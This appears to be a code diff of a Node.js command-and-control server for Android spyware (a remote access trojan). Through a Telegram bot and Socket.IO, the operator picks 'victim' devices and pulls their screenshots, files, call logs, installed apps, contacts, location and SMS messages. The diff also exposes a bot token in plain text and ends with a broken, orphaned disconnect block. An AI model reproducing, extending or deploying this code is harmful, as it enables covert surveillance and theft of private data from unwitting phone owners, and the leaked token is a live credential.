@@ -1,47 +1,143 @@
-const io = require("socket.io")(3000, { cors: { origin: "*" } });
 const TelegramBot = require("node-telegram-bot-api");
+const { Server } = require("socket.io");
 
-// ضع التوكن الخاص بالبوت
-const TOKEN = "6306639467:AAG69iSWfHTUMudYjFTkFciQPkN_OP-tcv4";
-const CHAT_ID = "1794736105"; // معرف الشات اللي البوت يرسل له
-const bot = new TelegramBot(TOKEN, { polling: true });
+// إعداد البوت
+const token = "6306639467:AAG69iSWfHTUMudYjFTkFciQPkN_OP-tcv4";
+const bot = new TelegramBot(token, { polling: true });
 
-let adminSocketId = null;
-let victimList = {};
-let victimData = {};
+// إعداد Socket.IO
+const io = new Server(3000, { cors: { origin: "*" } });
 
-// دالة إرسال إشعار للتيليجرام
-function notifyTelegram(msg) {
-  bot.sendMessage(CHAT_ID, msg);
+// قائمة الأجهزة المتصلة (مثال)
+let victimList = {}; // { deviceId: socketId }
+let victimData = {}; // { deviceId: { model, otherInfo } }
+
+// --------- دوال مساعدة ---------
+
+// عرض قائمة الأجهزة
+function sendDevicesList(chatId) {
+  const devices = Object.keys(victimList);
+  if (devices.length === 0) {
+    bot.sendMessage(chatId, "⚠️ لا يوجد أجهزة متصلة حالياً.");
+    return;
+  }
+
+  const keyboard = devices.map((id) => [{ text: `${id}`, callback_data: `device_${id}` }]);
+  bot.sendMessage(chatId, "📱 اختر الجهاز:", { reply_markup: { inline_keyboard: keyboard } });
 }
 
+// عرض لوحة تحكم جهاز
+function sendDeviceControl(chatId, deviceId) {
+  bot.sendMessage(chatId, `✅ اخترت الجهاز:\n🆔 ${deviceId}\n📱 ${victimData[deviceId]?.model || "غير معروف"}`, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📸 لقطة شاشة", callback_data: `cmd_screenshot_${deviceId}` }],
+        [{ text: "📂 الملفات", callback_data: `cmd_getDir_${deviceId}` }],
+        [{ text: "📞 سجل المكالمات", callback_data: `cmd_getCallLog_${deviceId}` }],
+        [{ text: "📱 التطبيقات", callback_data: `cmd_getInstalledApps_${deviceId}` }],
+        [{ text: "👤 جهات الاتصال", callback_data: `cmd_getContacts_${deviceId}` }],
+        [{ text: "📍 الموقع", callback_data: `cmd_getLocation_${deviceId}` }],
+        [{ text: "📩 الرسائل", callback_data: `cmd_getSMS_${deviceId}` }],
+        [{ text: "💬 أرسل SMS", callback_data: `cmd_sendSMS_${deviceId}` }],
+        [{ text: "🔙 رجوع", callback_data: "back_to_devices" }]
+      ]
+    }
+  });
+}
+
+// --------- أوامر البوت ---------
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, "👋 مرحباً! اختر أحد الأوامر:", {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📱 الأجهزة المتصلة", callback_data: "show_devices" }]
+      ]
+    }
+  });
+});
+
+bot.onText(/\/devices/, (msg) => {
+  sendDevicesList(msg.chat.id);
+});
+
+// --------- التعامل مع أزرار Inline ---------
+bot.on("callback_query", (query) => {
+  const chatId = query.message.chat.id;
+  const data = query.data;
+
+  // عرض قائمة الأجهزة
+  if (data === "show_devices" || data === "back_to_devices") {
+    sendDevicesList(chatId);
+    return;
+  }
+
+  // اختيار جهاز
+  if (data.startsWith("device_")) {
+    const deviceId = data.split("_")[1];
+    sendDeviceControl(chatId, deviceId);
+    return;
+  }
+
+  // أوامر الأجهزة
+  if (data.startsWith("cmd_")) {
+    const [ , command, deviceId ] = data.split("_");
+
+    switch (command) {
+      case "screenshot":
+        io.to(victimList[deviceId]).emit("request", { type: "screenshot", id: deviceId });
+        bot.sendMessage(chatId, `📸 جاري طلب لقطة شاشة من ${deviceId}...`);
+        break;
+      case "getDir":
+        io.to(victimList[deviceId]).emit("request", { type: "getDir", id: deviceId });
+        bot.sendMessage(chatId, `📂 جاري جلب الملفات من ${deviceId}...`);
+        break;
+      case "getCallLog":
+        io.to(victimList[deviceId]).emit("request", { type: "getCallLog", id: deviceId });
+        bot.sendMessage(chatId, `📞 جاري جلب سجل المكالمات من ${deviceId}...`);
+        break;
+      case "getInstalledApps":
+        io.to(victimList[deviceId]).emit("request", { type: "getInstalledApps", id: deviceId });
+        bot.sendMessage(chatId, `📱 جاري جلب التطبيقات المثبتة من ${deviceId}...`);
+        break;
+      case "getContacts":
+        io.to(victimList[deviceId]).emit("request", { type: "getContacts", id: deviceId });
+        bot.sendMessage(chatId, `👤 جاري جلب جهات الاتصال من ${deviceId}...`);
+        break;
+      case "getLocation":
+        io.to(victimList[deviceId]).emit("request", { type: "getLocation", id: deviceId });
+        bot.sendMessage(chatId, `📍 جاري جلب الموقع من ${deviceId}...`);
+        break;
+      case "getSMS":
+        io.to(victimList[deviceId]).emit("request", { type: "getSMS", id: deviceId });
+        bot.sendMessage(chatId, `📩 جاري جلب الرسائل من ${deviceId}...`);
+        break;
+      case "sendSMS":
+        bot.sendMessage(chatId, `💬 أرسل رسالة لجهاز ${deviceId} باستخدام أمر خاص.`);
+        break;
+    }
+  }
+});
+
+// --------- استقبال الأجهزة عبر Socket.IO ---------
 io.on("connection", (socket) => {
-  console.log(`📡 Socket connected: ${socket.id}`);
+  console.log(`⚡ جهاز متصل: ${socket.id}`);
 
-  socket.on("adminJoin", () => {
-    adminSocketId = socket.id;
-    notifyTelegram("👑 Admin joined السيرفر");
-    Object.keys(victimData).forEach((key) => {
-      socket.emit("join", victimData[key]);
-    });
+  socket.on("register", (data) => {
+    const { deviceId, model } = data;
+    victimList[deviceId] = socket.id;
+    victimData[deviceId] = { model };
+    console.log(`✅ تم تسجيل الجهاز: ${deviceId} (${model})`);
   });
 
-  socket.on("join", (device) => {
-    victimList[device.id] = socket.id;
-    victimData[device.id] = { ...device, socketId: socket.id };
-    notifyTelegram(`📱 جهاز جديد انضم:\n🆔 ${device.id}\n📱 الموديل: ${device.model}`);
-    socket.broadcast.emit("join", { ...device, socketId: socket.id });
+  socket.on("disconnect", () => {
+    const deviceId = Object.keys(victimList).find(key => victimList[key] === socket.id);
+    if (deviceId) {
+      delete victimList[deviceId];
+      delete victimData[deviceId];
+      console.log(`❌ الجهاز فصل: ${deviceId}`);
+    }
   });
-
-  // مثال: إرسال SMS أو بيانات أخرى إلى التليجرام
-  socket.on("getSMS", (data) => {
-    notifyTelegram(`📩 SMS من ${data.number}: ${data.body}`);
-  });
-
-  socket.on("getLocation", (data) => {
-    notifyTelegram(`📍 الموقع: lat=${data.lat}, lon=${data.lon}`);
-  });
-
+});
   socket.on("disconnect", () => {
     if (socket.id === adminSocketId) {
       adminSocketId = null;
